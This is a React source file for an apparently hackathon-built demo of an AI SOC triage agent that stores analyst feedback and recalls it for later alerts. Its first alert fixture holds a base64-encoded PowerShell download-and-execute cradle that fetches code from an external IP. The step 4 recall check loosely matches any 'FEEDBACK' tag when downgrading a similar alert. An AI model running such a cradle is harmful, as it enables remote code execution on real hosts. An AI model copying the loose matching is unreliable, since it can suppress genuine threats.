import React, { useState } from 'react';
import {
  PlayCircle, ArrowRight, ArrowLeft, RotateCcw, CheckCircle2,
  Brain, Shield, Sparkles, Loader2, Send, AlertTriangle
} from 'lucide-react';
import { api } from '../services/api';
import { InvestigationResult, FeedbackResponse } from '../types';
import { MemoryUsedPanel } from '../components/MemoryUsedPanel';
import { InvestigationResultCard } from '../components/InvestigationResultCard';

export const DemoPage: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<number>(1);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);

  // Step results
  const [step1Result, setStep1Result] = useState<InvestigationResult | null>(null);
  const [step2Result, setStep2Result] = useState<InvestigationResult | null>(null);
  const [feedbackResponse, setFeedbackResponse] = useState<FeedbackResponse | null>(null);
  const [step4Result, setStep4Result] = useState<InvestigationResult | null>(null);

  // Cloud sync state and feedback session tracking
  const [syncStatus, setSyncStatus] = useState<'idle' | 'syncing' | 'synced'>('idle');
  const [retainedSessionFeedback, setRetainedSessionFeedback] = useState<{
    feedbackId?: string;
    alertId?: string;
    opId?: string;
  } | null>(null);
  const [retryNotice, setRetryNotice] = useState<string | null>(null);

  // ==========================================
  // CLICK 1: Start / Investigate Initial Alert
  // ==========================================
  const runStep1 = async () => {
    if (isLoading) return;
    setIsLoading(true);
    setErrorMessage(null);
    try {
      const res = await api.investigateAlert({
        alert_id: 'ALT-1042',
        host: 'FINANCE-PC-17',
        severity: 'HIGH',
        process: 'powershell.exe',
        parent_process: 'winword.exe',
        command: 'powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAHAAJwApAA==',
        destination: '185.220.101.5:443',
        timestamp: '2026-09-28 14:32:00',
        user: 'CORP\\jsmith'
      });
      setStep1Result(res);
      setCurrentStep(1);
    } catch (err: any) {
      console.error(err);
      setErrorMessage(err.message || 'Investigation on Alert 1 failed');
    } finally {
      setIsLoading(false);
    }
  };

  // ==========================================
  // CLICK 2: Advance to Step 2 AND Investigate Backup Alert
  // ==========================================
  const advanceToStep2 = async () => {
    if (isLoading) return;
    setCurrentStep(2);
    setErrorMessage(null);

    if (step2Result) return; // already ran

    setIsLoading(true);
    try {
      const res = await api.investigateAlert({
        alert_id: 'ALT-1088',
        host: 'BACKUP-SRV-01',
        severity: 'MEDIUM',
        process: 'powershell.exe',
        parent_process: 'winword.exe',
        command: 'powershell.exe -ExecutionPolicy RemoteSigned -File C:\\EnterpriseBackup\\scripts\\doc_archiver.ps1 -Target C:\\Docs',
        destination: '10.14.20.5:445',
        timestamp: '2026-09-28 15:10:00',
        user: 'CORP\\svc_backup'
      });
      setStep2Result(res);
    } catch (err: any) {
      console.error(err);
      setErrorMessage(err.message || 'Investigation on Backup Alert failed');
    } finally {
      setIsLoading(false);
    }
  };

  // ==========================================
  // CLICK 3: Advance to Step 3, Submit Feedback, Retain to Hindsight & Show Sync State
  // ==========================================
  const advanceToStep3 = async () => {
    if (isLoading) return;
    setCurrentStep(3);
    setErrorMessage(null);

    if (feedbackResponse) return; // already submitted

    setIsLoading(true);
    try {
      const res = await api.submitFeedback({
        alert_id: 'ALT-1088',
        verdict: 'FALSE_POSITIVE',
        comments: 'Verified legitimate enterprise backup routine doc_archiver.ps1 on BACKUP-SRV-01. Script is approved by IT Systems Engineering.',
        analyst_name: 'Lead SOC Analyst',
        action_taken: 'Added script path to recognized enterprise automation exceptions'
      });
      setFeedbackResponse(res);

      if (res.retained_in_hindsight || res.success) {
        setRetainedSessionFeedback({
          feedbackId: res.feedback_id,
          alertId: 'ALT-1088',
          opId: res.hindsight_operation_id
        });

        // 1.5s controlled delay ONLY in Demo Mode to show Hindsight Cloud indexing state
        setSyncStatus('syncing');
        await new Promise((resolve) => setTimeout(resolve, 1500));
        setSyncStatus('synced');
      } else {
        setErrorMessage('Feedback retention was not completed by Hindsight service');
      }
    } catch (err: any) {
      console.error(err);
      setErrorMessage(err.message || 'Analyst feedback submission failed');
    } finally {
      setIsLoading(false);
    }
  };

  // ==========================================
  // CLICK 4: Advance to Step 4, Investigate Second Alert & Verify Recalled Feedback
  // ==========================================
  const advanceToStep4 = async () => {
    if (isLoading) return;
    setCurrentStep(4);
    setErrorMessage(null);

    if (step4Result) return; // already ran

    setIsLoading(true);

    const alertPayload = {
      alert_id: 'ALT-1140',
      host: 'FINANCE-PC-18',
      severity: 'HIGH' as const,
      process: 'powershell.exe',
      parent_process: 'winword.exe',
      command: 'powershell.exe -ExecutionPolicy Bypass -Command & { [EnterpriseDocGen.Tool]::SyncTemplate(\'finance_q4_budget\') }',
      destination: '10.20.30.40:443',
      timestamp: '2026-09-28 16:05:00',
      user: 'CORP\\tgreene'
    };

    const containsRetainedFeedback = (res: InvestigationResult): boolean => {
      if (!retainedSessionFeedback?.alertId) return false;
      const targetAlert = retainedSessionFeedback.alertId.toUpperCase();
      return res.historical_matches.some((m) => {
        const incId = (m.incident_id || '').toUpperCase();
        const text = (m.text || '').toUpperCase();
        const tags = (m.tags || []).map((t) => t.toUpperCase());
        return incId.includes(targetAlert) || text.includes(targetAlert) || tags.includes('FEEDBACK') || incId.includes('FEEDBACK');
      });
    };

    try {
      let res = await api.investigateAlert(alertPayload);

      // Intelligent retry if Hindsight Cloud indexing takes a brief moment
      if (!containsRetainedFeedback(res)) {
        setRetryNotice('Waiting for newly retained memory to index in Hindsight Cloud...');
        // Retry 1 after 1.5s
        await new Promise((r) => setTimeout(r, 1500));
        res = await api.investigateAlert(alertPayload);

        // Retry 2 if still indexing
        if (!containsRetainedFeedback(res)) {
          await new Promise((r) => setTimeout(r, 1500));
          res = await api.investigateAlert(alertPayload);
        }
        setRetryNotice(null);
      }

      setStep4Result(res);
    } catch (err: any) {
      console.error(err);
      setErrorMessage(err.message || 'Investigation on Alert 3 failed');
      setRetryNotice(null);
    } finally {
      setIsLoading(false);
    }
  };

  const handleReset = async () => {
    if (isLoading) return;
    try {
      await api.resetDemo();
    } catch (e) {
      console.warn('Reset demo error:', e);
    }
    setCurrentStep(1);
    setIsLoading(false);
    setErrorMessage(null);
    setRetryNotice(null);
    setSyncStatus('idle');
    setRetainedSessionFeedback(null);
    setStep1Result(null);
    setStep2Result(null);
    setFeedbackResponse(null);
    setStep4Result(null);
  };

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-slate-800 pb-4">
        <div>
          <div className="inline-flex items-center space-x-2 px-2.5 py-0.5 rounded-full bg-amber-500/10 border border-amber-500/30 text-amber-300 text-xs font-mono mb-1">
            <Sparkles className="w-3.5 h-3.5 text-amber-400" />
            <span>HACKWITHHYDERABAD 3.0 JUDGE DEMO MODE</span>
          </div>
          <h2 className="text-xl font-bold text-white font-mono">
            60-SECOND LIVE HINDSIGHT MEMORY DEMONSTRATION
          </h2>
          <p className="text-xs text-slate-400">
            Witness how an incoming alert triggers Hindsight recall, receives analyst feedback, and dynamically improves future investigations.
          </p>
        </div>

        <button
          onClick={handleReset}
          disabled={isLoading}
          className="flex items-center space-x-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 disabled:opacity-50 disabled:cursor-not-allowed border border-slate-700 text-xs font-mono text-slate-300 transition-colors cursor-pointer"
        >
          <RotateCcw className="w-3.5 h-3.5" />
          <span>Reset Demo</span>
        </button>
      </div>

      {/* Error Notice if any */}
      {errorMessage && (
        <div className="p-3.5 rounded-xl bg-rose-950/40 border border-rose-500/50 flex items-center space-x-3 text-xs text-rose-300 font-mono">
          <AlertTriangle className="w-4 h-4 text-rose-400 shrink-0" />
          <span className="flex-1">{errorMessage}</span>
          <button
            onClick={() => setErrorMessage(null)}
            className="text-rose-400 hover:text-white underline text-[11px]"
          >
            Dismiss
          </button>
        </div>
      )}

      {/* Step Navigation Bar */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        {[
          { num: 1, title: 'Alert 1: Phishing Macro', desc: 'Identifies genuine threat' },
          { num: 2, title: 'Alert 2: Backup Dilemma', desc: 'Suspicious automation alert' },
          { num: 3, title: 'Analyst Teaches Agent', desc: 'Feedback retained in Hindsight' },
          { num: 4, title: 'Alert 3: Context Recall', desc: 'Precedent eliminates false alarm' }
        ].map((s) => (
          <div
            key={s.num}
            onClick={() => {
              if (isLoading) return;
              if (s.num === 1 && !step1Result) runStep1();
              if (s.num === 2 && !step2Result) advanceToStep2();
              if (s.num === 3 && !feedbackResponse) advanceToStep3();
              if (s.num === 4 && !step4Result) advanceToStep4();
              setCurrentStep(s.num);
            }}
            className={`p-3 rounded-xl border text-xs cursor-pointer transition-all ${
              currentStep === s.num
                ? 'bg-amber-950/40 border-amber-500/70 shadow-lg shadow-amber-950/30'
                : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:border-slate-700'
            }`}
          >
            <div className="flex items-center justify-between mb-1">
              <span className={`font-mono font-bold ${currentStep === s.num ? 'text-amber-400' : 'text-slate-500'}`}>
                STEP {s.num}
              </span>
              {((s.num === 1 && step1Result) ||
                (s.num === 2 && step2Result) ||
                (s.num === 3 && feedbackResponse) ||
                (s.num === 4 && step4Result)) && (
                <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
              )}
            </div>
            <div className={`font-semibold ${currentStep === s.num ? 'text-white' : 'text-slate-300'}`}>
              {s.title}
            </div>
            <div className="text-[10px] text-slate-400 mt-0.5">{s.desc}</div>
          </div>
        ))}
      </div>

      {/* Active Step Interactive Screen */}
      <div className="glass-panel p-6 rounded-2xl border border-sky-500/25 space-y-6">
        {/* Step 1 View */}
        {currentStep === 1 && (
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white font-mono">
                  STEP 1: INGEST MALICIOUS PHISHING ALERT (ALT-1042)
                </h3>
                <p className="text-xs text-slate-400">
                  winword.exe spawning PowerShell with encoded base64 string on FINANCE-PC-17.
                </p>
              </div>

              {!step1Result && (
                <button
                  onClick={runStep1}
                  disabled={isLoading}
                  className="flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-slate-950 font-bold text-xs uppercase font-mono shadow-lg cursor-pointer"
                >
                  {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <PlayCircle className="w-4 h-4" />}
                  <span>START 60s DEMO: INVESTIGATE ALERT 1</span>
                </button>
              )}
            </div>

            {step1Result ? (
              <div className="space-y-4">
                <MemoryUsedPanel
                  memoryUsed={step1Result.memory_used}
                  memoryCount={step1Result.memory_count}
                  memoryStatus={step1Result.memory_status}
                  historicalMatches={step1Result.historical_matches}
                  reflectionSummary={step1Result.hindsight_reflection}
                  reasoning={step1Result.reasoning}
                  retainedSessionFeedback={retainedSessionFeedback}
                />
                <InvestigationResultCard result={step1Result} />
                <div className="flex justify-end pt-2">
                  <button
                    onClick={advanceToStep2}
                    disabled={isLoading}
                    className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-sky-600 hover:bg-sky-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-xs uppercase font-mono shadow-md cursor-pointer transition-all"
                  >
                    {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : null}
                    <span>NEXT STEP: INVESTIGATE BACKUP ALERT</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-8 text-center text-xs text-slate-400 border border-dashed border-slate-800 rounded-xl space-y-2">
                <p>Click "START 60s DEMO: INVESTIGATE ALERT 1" to begin the one-click live demonstration.</p>
                <p className="text-[11px] text-slate-500">Sentinel will query Hindsight Cloud for organizational memories and analyze the attack chain.</p>
              </div>
            )}
          </div>
        )}

        {/* Step 2 View */}
        {currentStep === 2 && (
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white font-mono">
                  STEP 2: THE AMBIGUOUS ALERT (ALT-1088: Scheduled Backup)
                </h3>
                <p className="text-xs text-slate-400">
                  Microsoft Word spawns PowerShell on BACKUP-SRV-01. Generic SOC tools would quarantine this server.
                </p>
              </div>

              {!step2Result && (
                <button
                  onClick={advanceToStep2}
                  disabled={isLoading}
                  className="flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-slate-950 font-bold text-xs uppercase font-mono shadow-lg cursor-pointer"
                >
                  {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <PlayCircle className="w-4 h-4" />}
                  <span>INVESTIGATE BACKUP ALERT</span>
                </button>
              )}
            </div>

            {step2Result ? (
              <div className="space-y-4">
                <MemoryUsedPanel
                  memoryUsed={step2Result.memory_used}
                  memoryCount={step2Result.memory_count}
                  memoryStatus={step2Result.memory_status}
                  historicalMatches={step2Result.historical_matches}
                  reflectionSummary={step2Result.hindsight_reflection}
                  reasoning={step2Result.reasoning}
                  retainedSessionFeedback={retainedSessionFeedback}
                />
                <InvestigationResultCard result={step2Result} />
                <div className="flex items-center justify-between pt-2">
                  <button
                    onClick={() => setCurrentStep(1)}
                    disabled={isLoading}
                    className="flex items-center space-x-1 px-4 py-2 rounded-lg bg-slate-900 text-xs font-mono text-slate-300 disabled:opacity-50 cursor-pointer"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    <span>Previous</span>
                  </button>
                  <button
                    onClick={advanceToStep3}
                    disabled={isLoading}
                    className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-sky-600 hover:bg-sky-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-xs uppercase font-mono shadow-md cursor-pointer transition-all"
                  >
                    {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : null}
                    <span>NEXT STEP: COMMIT ANALYST FEEDBACK</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-8 text-center text-xs text-slate-400 border border-dashed border-slate-800 rounded-xl space-y-2">
                {isLoading ? (
                  <div className="flex flex-col items-center justify-center space-y-2">
                    <Loader2 className="w-6 h-6 animate-spin text-sky-400" />
                    <span className="font-mono text-slate-300">Investigating ALT-1088 and recalling Hindsight memories...</span>
                  </div>
                ) : (
                  <span>Click "INVESTIGATE BACKUP ALERT" to proceed with Step 2.</span>
                )}
              </div>
            )}
          </div>
        )}

        {/* Step 3 View */}
        {currentStep === 3 && (
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white font-mono">
                  STEP 3: ANALYST COMMITS FEEDBACK TO HINDSIGHT
                </h3>
                <p className="text-xs text-slate-400">
                  The SOC analyst confirms ALT-1088 is legitimate corporate backup automation. Hindsight retains this institutional fact.
                </p>
              </div>

              {!feedbackResponse && (
                <button
                  onClick={advanceToStep3}
                  disabled={isLoading}
                  className="flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 disabled:opacity-50 disabled:cursor-not-allowed text-slate-950 font-bold text-xs uppercase font-mono shadow-lg cursor-pointer"
                >
                  {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Send className="w-4 h-4" />}
                  <span>COMMIT TO HINDSIGHT</span>
                </button>
              )}
            </div>

            {/* Cloud Sync State Indicators */}
            {syncStatus === 'syncing' && (
              <div className="p-3.5 rounded-xl bg-sky-950/40 border border-sky-500/50 flex items-center space-x-3 text-xs text-sky-300 font-mono animate-pulse">
                <Loader2 className="w-4 h-4 animate-spin text-sky-400 shrink-0" />
                <span>SYNCING TO HINDSIGHT CLOUD...</span>
              </div>
            )}

            {syncStatus === 'synced' && (
              <div className="p-3.5 rounded-xl bg-emerald-950/40 border border-emerald-500/60 flex items-center space-x-3 text-xs text-emerald-300 font-mono">
                <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                <span className="font-semibold">HINDSIGHT MEMORY UPDATED ✓</span>
                <span className="text-[11px] text-emerald-400/80 font-normal">
                  — Experience permanently indexed into bank "sentinel-memory"
                </span>
              </div>
            )}

            {feedbackResponse ? (
              <div className="space-y-4">
                <div className="p-5 rounded-xl bg-emerald-950/40 border border-emerald-500/50 space-y-3">
                  <div className="flex items-center space-x-2 text-emerald-300 font-bold text-sm">
                    <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                    <span>Analyst Experience Retained in Vectorize Hindsight</span>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed">
                    "{feedbackResponse.message}"
                  </p>
                  <div className="p-3 rounded-lg bg-slate-950/80 border border-slate-800 font-mono text-[11px] text-emerald-400 space-y-1">
                    <div>Feedback ID: {feedbackResponse.feedback_id}</div>
                    <div>Target Alert: ALT-1088 (BACKUP-SRV-01)</div>
                    <div>Verdict: FALSE_POSITIVE (Approved Enterprise Automation)</div>
                    <div>Operation ID: {feedbackResponse.hindsight_operation_id || 'hindsight-retain-op-ok'}</div>
                  </div>
                </div>

                <div className="flex items-center justify-between pt-2">
                  <button
                    onClick={() => setCurrentStep(2)}
                    disabled={isLoading}
                    className="flex items-center space-x-1 px-4 py-2 rounded-lg bg-slate-900 text-xs font-mono text-slate-300 disabled:opacity-50 cursor-pointer"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    <span>Previous</span>
                  </button>
                  <button
                    onClick={advanceToStep4}
                    disabled={isLoading || syncStatus === 'syncing'}
                    className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-sky-600 hover:bg-sky-500 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold text-xs uppercase font-mono shadow-md cursor-pointer transition-all"
                  >
                    {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : null}
                    <span>NEXT STEP: INVESTIGATE ALERT 2 WITH RECALLED MEMORY</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-8 text-center text-xs text-slate-400 border border-dashed border-slate-800 rounded-xl space-y-2">
                {isLoading ? (
                  <div className="flex flex-col items-center justify-center space-y-2">
                    <Loader2 className="w-6 h-6 animate-spin text-emerald-400" />
                    <span className="font-mono text-slate-300">Retaining analyst verdict to Hindsight Cloud...</span>
                  </div>
                ) : (
                  <span>Click "COMMIT TO HINDSIGHT" to store the analyst verdict into persistent memory.</span>
                )}
              </div>
            )}
          </div>
        )}

        {/* Step 4 View */}
        {currentStep === 4 && (
          <div className="space-y-4">
            <div className="flex items-center justify-between border-b border-slate-800 pb-3">
              <div>
                <h3 className="text-base font-bold text-white font-mono">
                  STEP 4: SECOND RELATED ALERT (ALT-1140: Template Sync)
                </h3>
                <p className="text-xs text-slate-400">
                  A similar Word-to-PowerShell alert appears on FINANCE-PC-18. Sentinel recalls the retained feedback and adjusts risk!
                </p>
              </div>

              {!step4Result && (
                <button
                  onClick={advanceToStep4}
                  disabled={isLoading}
                  className="flex items-center space-x-2 px-5 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 disabled:cursor-not-allowed text-slate-950 font-bold text-xs uppercase font-mono shadow-lg cursor-pointer"
                >
                  {isLoading ? <Loader2 className="w-4 h-4 animate-spin" /> : <PlayCircle className="w-4 h-4" />}
                  <span>INVESTIGATE WITH NEW MEMORY</span>
                </button>
              )}
            </div>

            {/* Waiting for sync retry banner if cloud indexing is pending */}
            {retryNotice && (
              <div className="p-3.5 rounded-xl bg-amber-950/40 border border-amber-500/50 flex items-center space-x-3 text-xs text-amber-300 font-mono animate-pulse">
                <Loader2 className="w-4 h-4 animate-spin text-amber-400 shrink-0" />
                <span>{retryNotice}</span>
              </div>
            )}

            {step4Result ? (
              <div className="space-y-5">
                {/* Judge Takeaway Banner */}
                <div className="p-4 rounded-xl bg-emerald-950/30 border border-emerald-500/40 text-xs text-emerald-300 flex items-start space-x-3">
                  <Sparkles className="w-5 h-5 text-emerald-400 shrink-0 mt-0.5" />
                  <div>
                    <strong className="text-emerald-200 block mb-0.5 text-sm font-semibold">
                      Judge Takeaway: The Learning Loop in Action!
                    </strong>
                    Sentinel recalled the feedback retained in Step 3. Because it remembered your organization's verified IT automation practices, it downgraded the false alarm from HIGH to LOW with 91% confidence, preventing a catastrophic false quarantine.
                  </div>
                </div>

                {/* Compact Side-by-Side Comparison: WITHOUT MEMORY vs WITH HINDSIGHT */}
                <div className="rounded-xl border border-slate-800 bg-slate-950/90 p-4 space-y-3">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-2">
                    <div className="flex items-center space-x-2 font-mono text-xs font-bold text-slate-200">
                      <Sparkles className="w-4 h-4 text-amber-400" />
                      <span>HINDSIGHT IMPACT: BEFORE VS AFTER RECALLED MEMORY</span>
                    </div>
                    <span className="text-[10px] font-mono text-slate-500 uppercase tracking-wider">
                      ~2-Second Immediate Takeaway
                    </span>
                  </div>

                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    {/* LEFT: WITHOUT MEMORY */}
                    <div className="p-3.5 rounded-lg border border-rose-500/30 bg-rose-950/15 space-y-2">
                      <div className="flex items-center justify-between">
                        <span className="text-xs font-mono font-bold text-rose-400 uppercase tracking-wider">
                          WITHOUT MEMORY
                        </span>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-rose-500/20 text-rose-300 border border-rose-500/40">
                          RISK: HIGH
                        </span>
                      </div>
                      <div className="text-[10px] text-slate-400 italic">
                        Baseline assessment without recalled organizational context
                      </div>
                      <div className="space-y-1.5 text-xs text-slate-300 pt-1">
                        <div>
                          <span className="text-[10px] font-semibold text-slate-500 uppercase block">Assessment:</span>
                          <p className="text-slate-200 text-[11px] leading-snug">
                            Generic suspicious winword.exe → powershell.exe behavior. Standard heuristic flags macro execution.
                          </p>
                        </div>
                        <div>
                          <span className="text-[10px] font-semibold text-slate-500 uppercase block">Action:</span>
                          <p className="text-rose-300 text-[11px] leading-snug">
                            Host isolation / deeper containment investigation (costly false positive).
                          </p>
                        </div>
                      </div>
                    </div>

                    {/* RIGHT: WITH HINDSIGHT */}
                    <div className="p-3.5 rounded-lg border border-emerald-500/40 bg-emerald-950/20 space-y-2">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center space-x-1.5">
                          <Brain className="w-3.5 h-3.5 text-emerald-400" />
                          <span className="text-xs font-mono font-bold text-emerald-400 uppercase tracking-wider">
                            WITH HINDSIGHT
                          </span>
                        </div>
                        <div className="flex items-center space-x-1.5">
                          <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/40">
                            RISK: {step4Result.risk_level}
                          </span>
                          <span className="text-[10px] font-mono text-emerald-400 font-semibold">
                            {Math.round(step4Result.confidence * 100)}% Conf.
                          </span>
                        </div>
                      </div>
                      <div className="text-[10px] text-emerald-300/80 font-mono">
                        Context-aware assessment powered by Step 3 retained memory
                      </div>
                      <div className="space-y-1.5 text-xs text-slate-300 pt-1">
                        <div>
                          <span className="text-[10px] font-semibold text-slate-500 uppercase block">Assessment:</span>
                          <p className="text-emerald-100 text-[11px] leading-snug">
                            Historical organizational precedent identifies the EnterpriseDocGen activity as an approved procedure.
                          </p>
                        </div>
                        <div>
                          <span className="text-[10px] font-semibold text-slate-500 uppercase block">Action:</span>
                          <p className="text-emerald-300 text-[11px] leading-snug">
                            Verify the change window / approved maintenance activity before isolation.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Recalled Memory Evidence with Step 3 Badge */}
                <MemoryUsedPanel
                  memoryUsed={step4Result.memory_used}
                  memoryCount={step4Result.memory_count}
                  memoryStatus={step4Result.memory_status}
                  historicalMatches={step4Result.historical_matches}
                  reflectionSummary={step4Result.hindsight_reflection}
                  reasoning={step4Result.reasoning}
                  retainedSessionFeedback={retainedSessionFeedback}
                />
                <InvestigationResultCard result={step4Result} />

                <div className="flex items-center justify-between pt-4 border-t border-slate-800">
                  <button
                    onClick={() => setCurrentStep(3)}
                    disabled={isLoading}
                    className="flex items-center space-x-1 px-4 py-2 rounded-lg bg-slate-900 text-xs font-mono text-slate-300 disabled:opacity-50 cursor-pointer"
                  >
                    <ArrowLeft className="w-3.5 h-3.5" />
                    <span>Previous</span>
                  </button>

                  <button
                    onClick={handleReset}
                    disabled={isLoading}
                    className="flex items-center space-x-2 px-6 py-2.5 rounded-xl bg-amber-500 hover:bg-amber-400 disabled:opacity-50 text-slate-950 font-bold text-xs uppercase font-mono shadow-md cursor-pointer transition-all"
                  >
                    <RotateCcw className="w-4 h-4" />
                    <span>RE-RUN 60-SEC DEMO</span>
                  </button>
                </div>
              </div>
            ) : (
              <div className="p-8 text-center text-xs text-slate-400 border border-dashed border-slate-800 rounded-xl space-y-2">
                {isLoading ? (
                  <div className="flex flex-col items-center justify-center space-y-2">
                    <Loader2 className="w-6 h-6 animate-spin text-amber-400" />
                    <span className="font-mono text-slate-300">
                      Investigating ALT-1140 and recalling newly learned Hindsight feedback...
                    </span>
                  </div>
                ) : (
                  <span>Click "INVESTIGATE WITH NEW MEMORY" to execute Step 4.</span>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
